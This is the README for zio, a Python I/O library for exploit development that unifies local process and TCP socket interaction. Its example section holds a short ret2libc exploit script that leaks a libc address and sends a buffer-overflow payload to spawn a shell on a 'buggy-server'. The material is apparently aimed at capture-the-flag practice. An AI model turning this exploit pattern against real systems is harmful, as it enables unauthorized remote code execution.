
# zio

[![Build Status](https://travis-ci.org/zTrix/zio.png)](https://travis-ci.org/zTrix/zio)

[zio] is an easy-to-use io library for pwning development, supporting an unified interface for local process pwning and TCP socket io.

The primary goal of [zio] is to provide unified io interface between process stdin/stdout and TCP socket io. So when you have done local pwning development, you only need to change the io target to pwn the remote server.

The following code illustrate the basic idea.

```python
from zio import *

# io = zio('./buggy-server')            # used for local pwning development
# io = zio(('1.2.3.4', 1337))           # used to exploit remote service

io.write(your_awesome_ropchain_or_shellcode)
# hey, we get a shell!
io.interact()
```

## Examples
 
```python
from zio import *
io = zio('./buggy-server')
# io = zio((pwn.server, 1337))

for i in xrange(1337):
    io.writeline('add ' + str(i))
    io.read_until('>>')

io.write("add TFpdp1gL4Qu4aVCHUF6AY5Gs7WKCoTYzPv49QSa\ninfo " + "A" * 49 + "\nshow\n")
io.read_until('A' * 49)
libc_base = l32(io.read(4)) - 0x1a9960
libc_system = libc_base + 0x3ea70
libc_binsh = libc_base + 0x15fcbf
payload = 'A' * 64 + l32(libc_system) + 'JJJJ' + l32(libc_binsh)
io.write('info ' + payload + "\nshow\nexit\n")
io.read_until(">>")
# We've got a shell;-)
io.interact()
```

## Document

To be added... Please wait...

### about line break and carriage return

Just don't read '\n' or '\r', use `readline()` instead

## Thanks (Also references)

 - [pexpect](https://github.com/pexpect/pexpect) I borrowed a lot of code from here
 - [sh](https://github.com/amoffat/sh)
 - python subprocess module
 - TTY related
   - http://linux.die.net/man/3/cfmakeraw
   - http://marcocorvi.altervista.org/games/lkpe/tty/tty.htm
   - http://www.linusakesson.net/programming/tty/


[zio]:https://github.com/zTrix/zio
